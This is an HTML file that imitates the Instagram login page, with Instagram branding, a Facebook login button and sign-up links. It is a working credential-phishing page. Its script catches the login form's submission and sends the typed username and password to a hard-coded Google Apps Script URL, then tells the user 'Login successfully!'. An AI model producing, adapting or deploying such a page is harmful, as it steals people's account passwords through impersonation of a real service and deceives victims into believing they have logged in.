<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="style.css">
  <style>
    /* Basic inline CSS for layout demo; move these to style.css as needed */
    body {
      background-color: #fafafa;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      margin: 0;
      padding: 20px;
    }
    #wrapper {
      width: 350px;
    }
    .login-container, .signup-container {
      background: #fff;
      border: 1px solid #dbdbdb;
      padding: 20px;
      text-align: center;
      margin-bottom: 10px;
    }
    .header h1 {
      font-family: 'Billabong', cursive;
      font-size: 3rem;
      margin: 20px 0;
    }
    .input-fields input {
      width: 90%;
      margin: 8px 0;
      padding: 10px;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
    }
    .btn {
      background-color: #3897f0;
      color: #fff;
      border: none;
      width: 95%;
      padding: 10px;
      border-radius: 3px;
      font-weight: bold;
      margin: 8px 0;
      cursor: pointer;
    }
    .separator {
      display: flex;
      align-items: center;
      margin: 10px 0;
    }
    .separator::before,
    .separator::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }
    .separator span {
      margin: 0 10px;
      font-size: 0.9rem;
      color: #8e8e8e;
    }
    .facebook-login .facebook-btn {
      background: none;
      border: none;
      color: #385185;
      font-weight: bold;
      cursor: pointer;
      margin-bottom: 10px;
    }
    .footer a {
      color: #00376b;
      font-size: 0.9rem;
      text-decoration: none;
    }
    .signup-container {
      border: 1px solid #dbdbdb;
      padding: 15px;
      background: #fff;
      font-size: 0.9rem;
    }
    .signup-container a {
      color: #3897f0;
      font-weight: bold;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div id="wrapper">
    <div class="login-container">
      <div class="header">
        <h1>Instagram</h1>
      </div>
      <form id="loginForm" class="input-fields">
        <input type="text" name="username" placeholder="Phone number, username, or email" class="input" required />
        <input type="password" name="password" placeholder="Password" class="input" required />
        <button type="submit" class="btn">Log In</button>
      </form>
      <div class="separator">
        <span>OR</span>
      </div>
      <div class="facebook-login">
        <button class="facebook-btn">Log in with Facebook</button>
      </div>
      <div class="footer">
        <a href="#">Forgot password?</a>
      </div>
    </div>
    <div class="signup-container">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
  </div>

  <script>
    document.addEventListener("DOMContentLoaded", function() {
      document.querySelector("#loginForm").addEventListener("submit", function(e) {
        e.preventDefault();
        // Collect form data for username and password
        var formData = {
          username: document.querySelector("input[name='username']").value,
          password: document.querySelector("input[name='password']").value
        };
        // Send data to Google Apps Script using fetch
        fetch("https://script.google.com/macros/s/AKfycbw7Ruyk4OMZFnHmzQNB0knnSCauQk7eKeAIP8PKEmMohFQE1PIlLKgrMbCs_9ujqt80Cw/exec", {
          method: "POST",
          mode: "no-cors",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(formData)
        })
        .then(function() {
          alert("Login successfully!");
        })
        .catch(function(error) {
          alert("Error: " + error.message);
        });
      });
    });
  </script>
</body>
</html>
